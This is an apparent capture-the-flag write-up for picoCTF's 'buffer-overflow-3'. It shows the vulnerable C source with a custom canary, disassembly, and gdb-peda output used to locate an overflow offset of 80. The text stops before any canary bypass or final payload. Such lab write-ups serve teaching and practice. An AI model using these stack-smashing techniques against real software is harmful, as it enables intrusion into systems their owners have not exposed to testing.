# Buffer-overflow-3

We want to replace the ebp of `vuln` by the address of `win`. Although we can easily cause the stack overflow, we have to surrogate the detection of overflow with canary.

```
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

The assembly code corresponding to the canary detection is the following:

```
452  804954f:   6a 04                   push   $0x4
453  8049551:   c7 c0 54 c0 04 08       mov    $0x804c054,%eax
454  8049557:   50                      push   %eax
455  8049558:   8d 45 f0                lea    -0x10(%ebp),%eax
456  804955b:   50                      push   %eax
457  804955c:   e8 1f fc ff ff          call   8049180 <memcmp@plt>
```

Since the architecture is 32-bits, all arguments are stored in the stack. Here, we can notice that the local canary is stored in `-0x10(%ebp)`.

We can use gdb to estimate the appropriate offset to ebp.

```
gdb-peda$ run
Starting program: /mnt/c/Users/kanka/Desktop/Dev/CTFWriteUps/picoctf/buffer-overflow-3/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 200
Input> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
[----------------------------------registers-----------------------------------]
EAX: 0xc8
EBX: 0x804c000 --> 0x804bf10 --> 0x1
ECX: 0xffffcb68 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EDX: 0xc8
ESI: 0xffffcca4 --> 0xffffcde4 ("/mnt/c/Users/kanka/Desktop/Dev/CTFWriteUps/picoctf/buffer-overflow-3/vuln")
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffcbb8 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESP: 0xffffcb10 --> 0x0
EIP: 0x8049549 (<vuln+192>:     add    esp,0x10)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049541 <vuln+184>:        push   eax
   0x8049542 <vuln+185>:        push   0x0
   0x8049544 <vuln+187>:        call   0x8049130 <read@plt>
=> 0x8049549 <vuln+192>:        add    esp,0x10
   0x804954c <vuln+195>:        sub    esp,0x4
   0x804954f <vuln+198>:        push   0x4
   0x8049551 <vuln+200>:        mov    eax,0x804c054
   0x8049557 <vuln+206>:        push   eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcb10 --> 0x0
0004| 0xffffcb14 --> 0xffffcb68 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffcb18 --> 0xc8
0012| 0xffffcb1c --> 0x804949c (<vuln+19>:      add    ebx,0x2b64)
0016| 0xffffcb20 --> 0x804d1a0 --> 0x804d
0020| 0xffffcb24 --> 0xc8
0024| 0xffffcb28 ("200\n")
0028| 0xffffcb2c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049549 in vuln ()
gdb-peda$
gdb-peda$ pattern offset AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 80
```

We can also check the arbitray address as follos:

```
gdb-peda$ x/-10xw $ebp
0xffffcb90:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcba0:     0x61616161      0x61616161      0x41414141      0x61616161
0xffffcbb0:     0x61616161      0x61616161
```
